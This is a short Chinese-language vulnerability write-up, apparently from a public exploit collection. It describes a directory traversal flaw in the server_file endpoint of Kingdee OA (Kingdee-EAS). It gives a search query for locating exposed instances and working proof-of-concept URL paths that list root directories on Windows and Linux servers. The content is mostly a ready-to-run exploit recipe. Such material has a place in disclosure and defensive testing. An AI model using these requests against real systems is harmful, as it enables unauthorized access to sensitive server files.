# 金蝶OA server_file 目录遍历漏洞

## 漏洞描述

金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息

## 漏洞影响

<a-checkbox checked>金蝶OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="Kingdee-EAS"</a-checkbox></br>

## 漏洞复现

登录界面为



![img](../../../.vuepress/public/img/image-20210603132948792.png)

漏洞POC

```plain
/appmonitor/protected/selector/server_file/files?folder=/&suffix=
Windows服务器

appmonitor/protected/selector/server_file/files?folder=C://&suffix=

Linux服务器
appmonitor/protected/selector/server_file/files?folder=/&suffix=
```



![img](../../../.vuepress/public/img/image-20210603133136331.png)